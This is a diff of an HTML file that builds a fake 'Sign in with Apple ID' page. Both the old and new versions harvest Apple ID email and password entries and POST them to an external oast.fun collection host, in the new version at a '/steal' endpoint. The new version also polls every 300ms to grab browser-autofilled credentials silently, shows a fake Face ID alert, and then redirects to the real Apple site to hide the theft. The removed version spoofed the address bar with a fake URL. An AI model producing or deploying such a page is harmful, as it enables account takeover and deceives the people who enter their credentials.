@@ -1,117 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Sign in with Apple</title>
+  <meta charset="UTF-8">
+  <title>Sign in with Apple ID</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
-      margin: 0; padding: 0;
-      width: 100vw; height: 100vh;
-      background: black;
-      display: flex; align-items: center; justify-content: center;
+      margin: 0;
+      padding: 0;
       font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: #f2f2f7;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
-    button {
-      background: #1a73e8;
-      color: white;
-      font-size: 18px;
-      padding: 1em 2em;
+
+    .container {
+      background: white;
+      padding: 40px;
+      max-width: 320px;
+      width: 100%;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      border-radius: 12px;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 24px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
       border-radius: 8px;
+      font-size: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      background-color: #0071e3;
+      color: white;
+      font-size: 16px;
       border: none;
+      border-radius: 8px;
       cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005bb5;
+    }
+
+    .small-text {
+      font-size: 12px;
+      color: #555;
+      margin-top: 16px;
     }
   </style>
 </head>
 <body>
-  <button id="launch">Login with Apple</button>
+  <div class="container">
+    <h2>🔒 Sign in with Apple ID</h2>
+    <form id="login-form">
+      <input type="email" id="email" name="email" placeholder="Apple ID" autocomplete="on" required><br>
+      <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="on" required><br>
+      <button type="submit">Continue</button>
+    </form>
+    <div class="small-text">Your Apple ID is the email address you use to sign in.</div>
+  </div>
 
   <script>
-    document.getElementById('launch').onclick = async () => {
-      await document.documentElement.requestFullscreen();
+    function exfiltrate() {
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("pass").value;
 
-      const win = window.open('', '_blank');
+      if (email && pass) {
+        fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
+          method: "POST",
+          body: JSON.stringify({ email, pass }),
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+    }
+
+    // Trigger on manual input + polling (for autofill)
+    document.getElementById("login-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+      exfiltrate();
+      alert("Face ID authentication required...");
       setTimeout(() => {
-        win.document.open();
-        win.document.write(`
-          <style>
-            html, body {
-              margin: 0;
-              font-family: -apple-system, sans-serif;
-              background: #f2f2f7;
-              width: 100vw; height: 100vh;
-              overflow: hidden;
-            }
-            .spoof-bar {
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 38px;
-              background: #ffffff;
-              border-bottom: 1px solid #ccc;
-              font-size: 14px;
-              padding-left: 12px;
-              display: flex;
-              align-items: center;
-              font-weight: 500;
-              z-index: 9999;
-            }
-            .spoof-bar::before {
-              content: "🔒 https://appleid.apple.com";
-              color: #333;
-            }
-            .container {
-              padding: 60px 20px 20px;
-            }
-            input {
-              width: 100%;
-              padding: 12px;
-              margin-top: 15px;
-              font-size: 16px;
-              border-radius: 6px;
-              border: 1px solid #ccc;
-            }
-            button {
-              margin-top: 20px;
-              padding: 12px;
-              width: 100%;
-              font-size: 16px;
-              background: #1a73e8;
-              color: white;
-              border: none;
-              border-radius: 8px;
-            }
-          </style>
-          <div class="spoof-bar"></div>
-          <div class="container">
-            <h2>Sign in with Apple</h2>
-            <input id="email" placeholder="Apple ID (email)">
-            <input id="password" type="password" placeholder="Password">
-            <button onclick="send()">Continue</button>
-          </div>
+        location.href = "https://appleid.apple.com";
+      }, 2000);
+    });
 
-          <script>
-            function send() {
-              const data = {
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value
-              };
-              fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(data)
-              });
-
-              alert("Face ID authentication required");
-              setTimeout(() => {
-                location.replace("https://appleid.apple.com");
-              }, 2000);
-            }
-          <\/script>
-        `);
-        win.document.close();
-      }, 150); // Race-safe
-    };
+    // Poll every 300ms in case autofill is used silently
+    setInterval(() => {
+      const e = document.getElementById("email");
+      const p = document.getElementById("pass");
+      if (e && p && e.value && p.value) {
+        exfiltrate();
+      }
+    }, 300);
   </script>
 </body>
 </html>
